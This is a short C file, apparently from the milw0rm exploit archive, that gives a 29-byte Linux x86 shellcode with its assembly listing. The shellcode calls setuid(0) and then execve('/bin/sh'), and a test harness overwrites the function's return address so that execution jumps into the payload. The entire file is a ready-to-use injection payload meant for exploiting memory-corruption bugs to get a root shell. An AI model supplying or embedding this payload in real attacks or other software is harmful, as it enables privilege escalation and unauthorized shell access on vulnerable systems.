/*
  (c)1999-2003 Shellcode Research
      http://www.shellcode.com.ar

   execve(/bin/sh) for linux x86
   29 bytes
   by Matias Sedalo

        xorl    %ebx, %ebx
        pushl   %ebx
        leal    0x17(%ebx),%eax
        int     $0x80
        cdq
        pushl   $0x68732f6e
        pushl   $0x69622f2f
        movl    %esp, %ebx
        pushl   %eax
        pushl   %ebx
        movl    %esp, %ecx
        movb    $0xb, %al
        int     $0x80
*/


char shellcode[] =
"\x31\xdb\x53\x8d\x43\x17\xcd\x80\x99\x68\x6e\x2f\x73\x68\x68"
"\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

main()
{
        int *ret;
        ret=(int *)&ret +2;
        printf("Shellcode lenght=%d\n",strlen(shellcode));
        (*ret) = (int)shellcode;
}

// milw0rm.com [2004-09-12]